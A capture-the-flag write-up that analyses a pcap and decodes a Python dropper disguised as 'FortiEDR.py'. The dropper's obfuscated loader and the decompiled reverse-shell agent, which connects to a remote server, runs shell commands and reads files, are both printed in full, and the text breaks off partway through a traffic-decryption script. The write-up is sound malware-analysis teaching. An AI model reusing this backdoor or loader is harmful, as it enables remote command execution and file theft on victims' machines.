# Avengers Disassemble!

 * Category: Misc.
 * Solved by the JCTF Team

## Description

> Decrypt malware traffic to discover the flag!

A network capture was attached.

## Solution

The attached network capture contains a single `GET` command to download a Python script, followed
by some back and forth encrypted payload exchange.

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Avengers_Disassemble]
└─$ tshark -r Avengers_Disassemble.pcap -Y "tcp.flags.push == 1"
    4   0.000344 172.29.102.84 → 172.29.96.1  HTTP 196 GET /FortiEDR.py HTTP/1.1
    5   0.002322  172.29.96.1 → 172.29.102.84 TCP 245 HTTP/1.0 200 OK
    7   0.002800  172.29.96.1 → 172.29.102.84 HTTP 7943 HTTP/1.0 200 OK  (text/x-python)
   15   1.564535 172.29.102.84 → 172.29.96.1  TCP 1750 59614 → 2025 [PSH, ACK] Seq=1 Ack=1 Win=64256 Len=1696
   17   8.981774  172.29.96.1 → 172.29.102.84 TCP 86 2025 → 59614 [PSH, ACK] Seq=1 Ack=1697 Win=2102272 Len=32
   19   8.985293 172.29.102.84 → 172.29.96.1  TCP 70 59614 → 2025 [PSH, ACK] Seq=1697 Ack=33 Win=64256 Len=16
   21  14.470394  172.29.96.1 → 172.29.102.84 TCP 86 2025 → 59614 [PSH, ACK] Seq=33 Ack=1713 Win=2102272 Len=32
   22  14.474196 172.29.102.84 → 172.29.96.1  TCP 422 59614 → 2025 [PSH, ACK] Seq=1713 Ack=65 Win=64256 Len=368
   24  27.543844  172.29.96.1 → 172.29.102.84 TCP 102 2025 → 59614 [PSH, ACK] Seq=65 Ack=2081 Win=2102016 Len=48
   25  27.545076 172.29.102.84 → 172.29.96.1  TCP 1622 59614 → 2025 [PSH, ACK] Seq=2081 Ack=113 Win=64256 Len=1568
   27  39.977294  172.29.96.1 → 172.29.102.84 TCP 86 2025 → 59614 [PSH, ACK] Seq=113 Ack=3649 Win=2102272 Len=32
   28  39.981291 172.29.102.84 → 172.29.96.1  TCP 86 59614 → 2025 [PSH, ACK] Seq=3649 Ack=145 Win=64256 Len=32
   30  49.564061  172.29.96.1 → 172.29.102.84 TCP 86 2025 → 59614 [PSH, ACK] Seq=145 Ack=3681 Win=2102272 Len=32
   31  49.564767 172.29.102.84 → 172.29.96.1  TCP 86 59614 → 2025 [PSH, ACK] Seq=3681 Ack=177 Win=64256 Len=32
   33  56.435731  172.29.96.1 → 172.29.102.84 TCP 86 2025 → 59614 [PSH, ACK] Seq=177 Ack=3713 Win=2102272 Len=32
```

We should start by extracting and inspecting the Python script:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Avengers_Disassemble]
└─$ tshark -r Avengers_Disassemble.pcap -o "tcp.desegment_tcp_streams: TRUE" -o "tcp.no_subdissector_on_error: FALSE" --export-objects "http,exported_objects"

┌──(user@kali3)-[/media/sf_CTFs/bsides/Avengers_Disassemble]
└─$ ls exported_objects
FortiEDR.py
```

The script itself is encoded:

```python
import marshal
import base64

def protect_endpoint():
    protection = b'''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'''
    return base64.b64decode(protection)

def clean_quarantine(e, d):
    return bytes([e[r] ^ d[r%len(d)] for r in range(len(e))])

def complete_protection():
    anti_encryption = b'''\x1a\xb2\xba\xab\x80K\x8c\xce\xbf[E\x04\xe8\x91)\xcb'''
    edr = marshal.loads(clean_quarantine(protect_endpoint(), anti_encryption))
    exec(edr)
    Agent(srv="172.29.96.1").launch()

complete_protection()
```

In theory, decoding it should be easy, we just follow the same logic to decrypt and unmarshal
it, without executing it. The following script should do that, and also create a `pyc` file
for use to decompile later:

```python
import dis
import marshal
import base64

def write_pyc(code_obj, filename="out.pyc"):
    magic = importlib.util.MAGIC_NUMBER  # 4-byte magic for this Python
    flags = 0                            # timestamp-based pyc
    mtime = int(time.time())             # fake "last modified" time
    size = 0                             # size-of-source; can be 0 for tools

    # PEP 552 header layout for timestamp-based pyc:
    # magic(4) | flags(4) | mtime(4) | size(4)
    header = magic + struct.pack("<LLL", flags, mtime, size)

    body = marshal.dumps(code_obj)

    with open(filename, "wb") as f:
        f.write(header)
        f.write(body)

def protect_endpoint():
    protection = b'''+bK6q4B...'''
    return base64.b64decode(protection)

def clean_quarantine(e, d):
    return bytes([e[r] ^ d[r % len(d)] for r in range(len(e))])

def decode_payload():
    anti_encryption = b'\x1a\xb2\xba\xab\x80K\x8c\xce\xbf[E\x04\xe8\x91)\xcb'
    encrypted_data = protect_endpoint()
    decrypted_bytes = clean_quarantine(encrypted_data, anti_encryption)
    code_object = marshal.loads(decrypted_bytes)    
    dis.dis(code_object)
    write_pyc(code_object, "out.pyc")

if __name__ == "__main__":
    decode_payload()
```

However, when running it, we get a frustrating error:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Avengers_Disassemble]
└─$ python3 decode.py
Traceback (most recent call last):
  File "/media/sf_CTFs/bsides/Avengers_Disassemble/decode.py", line 21, in <module>
    decode_payload()
    ~~~~~~~~~~~~~~^^
  File "/media/sf_CTFs/bsides/Avengers_Disassemble/decode.py", line 17, in decode_payload
    code_object = marshal.loads(decrypted_bytes)
SystemError: ../Objects/codeobject.c:456: bad argument to internal function
```

This is what happens when the Python version used to marshal the code isn't compatible with 
the one used to unmarshal it. The quickest workaround for that would be to try using 
a few different Python versions and see which ones works, preferably via some 
[online Python compiler](https://www.jdoodle.com/python3-programming-online) which allows
selecting the Python version to run with. After some trial and error, we find out that
Python 3.7.4 works like a charm, and proceed with it.

```console
┌──(user㉿kali3)-[/media/sf_CTFs/bsides/Avengers_Disassemble]
└─$ pyenv shell 3.7.4

┌──(user㉿kali3)-[/media/sf_CTFs/bsides/Avengers_Disassemble]
└─$ python3 -V
Python 3.7.4

┌──(user㉿kali3)-[/media/sf_CTFs/bsides/Avengers_Disassemble]
└─$ python3 decode.py | head -n 50
  1           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (('AES',))
              4 IMPORT_NAME              0 (Crypto.Cipher)
              6 IMPORT_FROM              1 (AES)
              8 STORE_NAME               1 (AES)
             10 POP_TOP

  2          12 LOAD_CONST               0 (0)
             14 LOAD_CONST               2 (None)
             16 IMPORT_NAME              2 (hashlib)
             18 STORE_NAME               2 (hashlib)
             20 LOAD_CONST               0 (0)
             22 LOAD_CONST               2 (None)
             24 IMPORT_NAME              3 (socket)
             26 STORE_NAME               3 (socket)
             28 LOAD_CONST               0 (0)
             30 LOAD_CONST               2 (None)
             32 IMPORT_NAME              4 (platform)
             34 STORE_NAME               4 (platform)

  3          36 LOAD_CONST               0 (0)
             38 LOAD_CONST               3 (('PIPE', 'Popen'))
             40 IMPORT_NAME              5 (subprocess)
             42 IMPORT_FROM              6 (PIPE)
             44 STORE_NAME               6 (PIPE)
             46 IMPORT_FROM              7 (Popen)
             48 STORE_NAME               7 (Popen)
             50 POP_TOP

  5          52 LOAD_BUILD_CLASS
             54 LOAD_CONST               4 (<code object Agent at 0x7f3841aada50, file "/tmp/joker.py", line 5>)
             56 LOAD_CONST               5 ('Agent')
             58 MAKE_FUNCTION            0
             60 LOAD_CONST               5 ('Agent')
             62 CALL_FUNCTION            2
             64 STORE_NAME               8 (Agent)
             66 LOAD_CONST               2 (None)
             68 RETURN_VALUE

Disassembly of <code object Agent at 0x7f3841aada50, file "/tmp/joker.py", line 5>:
  5           0 LOAD_NAME                0 (__name__)
              2 STORE_NAME               1 (__module__)
              4 LOAD_CONST               0 ('Agent')
              6 STORE_NAME               2 (__qualname__)

 17           8 LOAD_CONST               1 ("  _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ \n |_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|\n                               | | ___ | | _____ _ __  / ||___  | ___|                                                                \n                            _  | |/ _ \\| |/ / _ \\ '__| | |   / /|___ \\                                                                \n                           | |_| | (_) |   <  __/ |    | |_ / /  ___) |                                                               \n  _         _   _           \\___/ \\___/|_|\\_\\___|_|    |_(_)_(_)|____/                   _   _           _      __                _   \n | |    ___| |_( )___   _ __  _   _| |_    __ _   ___ _ __ ___ (_) | ___    ___  _ __   | |_| |__   __ _| |_   / _| __ _  ___ ___| |  \n | |   / _ \\ __|// __| | '_ \\| | | | __|  / _` | / __| '_ ` _ \\| | |/ _ \\  / _ \\| '_ \\  | __| '_ \\ / _` | __| | |_ / _` |/ __/ _ \\ |  \n | |__|  __/ |_  \\__ \\ | |_) | |_| | |_  | (_| | \\__ \\ | | | | | | |  __/ | (_) | | | | | |_| | | | (_| | |_  |  _| (_| | (_|  __/_|  \n |_____\\___|\\__| |___/ | .__/ \\__,_|\\__|  \\__,_| |___/_| |_| |_|_|_|\\___|  \\___/|_| |_|  \\__|_| |_|\\__,_|\\__| |_|  \\__,_|\\___\\___(_)  \n  _____ _____ _____ ___|_|_____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ \n |_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|")
             10 STORE_NAME               3 (BANNER)

 19          12 LOAD_CONST              33 (('127.0.0.1', 2025, 'BSidesTLV2025{th!s_w@s_t00_e@sy_192346}'))
             14 LOAD_CONST               5 (<code object __init__ at 0x7f3841aad270, file "/tmp/joker.py", line 19>)
```

At this point we would want to use some kind of decompiler to decompile the code, for example
`uncompyle6`. These days, alternatively, we can push the disassembly to an LLM and get an
relatively impressive output. Just need to watch out for hallucinations. We call 
`uncompyle6 out.pyc > code.py` and get:

```python
# uncompyle6 version 3.9.3
# Python bytecode version base 3.7.0 (3394)
# Decompiled from: Python 3.7.4 (default, Dec  8 2025, 13:58:25)
# [GCC 15.2.0]
# Embedded file name: /tmp/joker.py
# Compiled at: 2025-12-11 18:10:15
from Crypto.Cipher import AES
import hashlib, socket, platform
from subprocess import PIPE, Popen

class Agent:
    BANNER = "  _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ \n |_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|\n                               | | ___ | | _____ _ __  / ||___  | ___|                                                                \n                            _  | |/ _ \\| |/ / _ \\ '__| | |   / /|___ \\                                                                \n                           | |_| | (_) |   <  __/ |    | |_ / /  ___) |                                                               \n  _         _   _           \\___/ \\___/|_|\\_\\___|_|    |_(_)_(_)|____/                   _   _           _      __                _   \n | |    ___| |_( )___   _ __  _   _| |_    __ _   ___ _ __ ___ (_) | ___    ___  _ __   | |_| |__   __ _| |_   / _| __ _  ___ ___| |  \n | |   / _ \\ __|// __| | '_ \\| | | | __|  / _` | / __| '_ ` _ \\| | |/ _ \\  / _ \\| '_ \\  | __| '_ \\ / _` | __| | |_ / _` |/ __/ _ \\ |  \n | |__|  __/ |_  \\__ \\ | |_) | |_| | |_  | (_| | \\__ \\ | | | | | | |  __/ | (_) | | | | | |_| | | | (_| | |_  |  _| (_| | (_|  __/_|  \n |_____\\___|\\__| |___/ | .__/ \\__,_|\\__|  \\__,_| |___/_| |_| |_|_|_|\\___|  \\___/|_| |_|  \\__|_| |_|\\__,_|\\__| |_|  \\__,_|\\___\\___(_)  \n  _____ _____ _____ ___|_|_____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ \n |_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|"

    def __init__(self, srv='127.0.0.1', prt=2025, key='BSidesTLV2025{th!s_w@s_t00_e@sy_192346}'):
        h = hashlib.sha512(key.encode()).digest()
        self.key = h[4[:36]]
        self.iv = open("./iv", "rb").read(AES.block_size)
        self.srv = srv
        self.prt = prt
        self.socket = None

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.srv, self.prt))

    def disconnect(self):
        self.socket.close()

    def send_data(self, data):
        enc = self.encrypt(data)
        if self.socket is None:
            raise Exception("Worker is not connected")
        self.socket.sendall(enc)

    def receive_data(self, buffer_size=4096):
        if self.socket is None:
            raise Exception("Worker is not connected")
        data = self.socket.recv(buffer_size)
        dec = self.decrypt(data)
        return dec.decode()

    def pad(self, data):
        length = AES.block_size - len(data) % AES.block_size
        return data + (chr(length) * length).encode()

    def unpad(self, data):
        return data[None[:-data[-1]]]

    def encrypt(self, data):
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded_data = self.pad(data)
        return self.shift(aes.encrypt(padded_data))

    def decrypt(self, data):
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypted_data = aes.decrypt(self.shift(data))
        return self.unpad(decrypted_data)

    def shift(self, data):
        out = b''
        for i in range(len(data) // 8):
            out += data[(i * 8)[:(i + 1) * 8]][None[None:-1]]

        return out + data[(len(data) // 8 * 8)[:None]][None[None:-1]]

    def run_command(self, command):
        with Popen(command, stdout=PIPE, stderr=PIPE, shell=PIPE) as process:
            out, err = process.communicate()
        return (out, err)

    def get_info(self):
        out = ""
        out += "Computer Name: {0}\n".format(platform.node())
        out += "OS Name: {0}\n".format(platform.system())
        out += "Local IP Address: {0}\n".format(socket.gethostbyname(socket.gethostname()))
        return out

    def launch(self):
        try:
            try:
                self.connect()
                self.send_data((Agent.BANNER + "\n" + self.get_info()).encode())
                while True:
                    try:
                        v = self.receive_data()
                        reply = b''
                        if v == "hAm$6C]5qQGnpX<4":
                            self.disconnect()
                            return
                            if v.startswith('Q3u~")!@Padtz_2r'):
                                out, err = self.run_command(v[16[:None]])
                                if out:
                                    reply += out
                        else:
                            reply += b'No output\n'
                        if err:
                            reply += err
                        else:
                            if v.startswith("bf)C._r]V4[+ZF2c"):
                                try:
                                    reply += open(v[16[:None]], "rb").read()
                                except Exception as e:
                                    try:
                                        reply += str(e).encode()
                                    finally:
                                        e = None
                                        del e

                        self.send_data(reply)
                    except UnicodeDecodeError:
                        self.send_data("Bad input command, please send command in string format")

            except Exception as e:
                try:
                    try:
                        print(e)
                    finally:
                        e = None
                        del e

                finally:
                    e = None
                    del e

        finally:
            self.disconnect()

# okay decompiling out.pyc
```

The script defines an Agent class that:

    * Connects outbound to a specified TCP server and port.
        * Uses AES-256-CBC + a custom byte-reversal (`shift`) to encrypt all traffic with a hard-coded key and IV from a file.
        * On connection, sends a big banner and some system info (hostname, OS, local IP).
        * Then enters a loop where it:
            * Accepts encrypted commands from the server.
            * Supports three main operations:
                * Exit: Special magic string to terminate connection.
                * Execute arbitrary shell commands and return `stdout`/`stderr`.
                * Read arbitrary files from disk and return the contents.

The encryption flow includes PKCS#7 padding, then AES-CBC encryption with a hardcoded key,
followed by a custom byte shift. So, in order to decrypt the payload, we need to unshift
the ciphertext, decrypt using AES-CBC and remove the PKCS#7 padding.

The malware's `shift` function splits data into 8-byte chunks, reverses each chunk
and finally reverses the remaining tail. Luckily, `shift` is symmetrical, so to reverse the
shift we can apply the same function again.

The last piece of information we need to fully decrypt the payload is the IV. The malware
reads it from the disc, and we don't have access to it. However, notice how the 
malware sends a constant ASCII art banner immediately after connecting.
This, in fact, gives us known plaintext for the first encrypted block:
Since `C1 = AES_encrypt(P1 ^ IV)`, then `AES_decrypt(C1) = P1 ^ IV` and therefore
`IV = AES_decrypt(C1) ^ P1`. 

Once recovered, this single IV works for all packets because the malware reuses it globally.

Putting it all together, we have:

```python
#!/usr/bin/env python3
import sys
import hashlib
from Crypto.Cipher import AES
from scapy.all import rdpcap, TCP, Raw, IP

# Same key string as in the Agent class
KEY_STR = "BSidesTLV2025{th!s_w@s_t00_e@sy_192346}"

PORT = 2025

# First 16 bytes of Agent.BANNER
KNOWN_PLAIN_BLOCK = "  _____ _____ __".encode("ascii")
# Check: len(KNOWN_PLAIN_BLOCK) == 16


def derive_key(key_str: str) -> bytes:
    """
    Derive the AES key exactly like Agent.__init__:
        h = sha512(key).digest()
        key = h[4:36]
    """
    h = hashlib.sha512(key_str.encode()).digest()
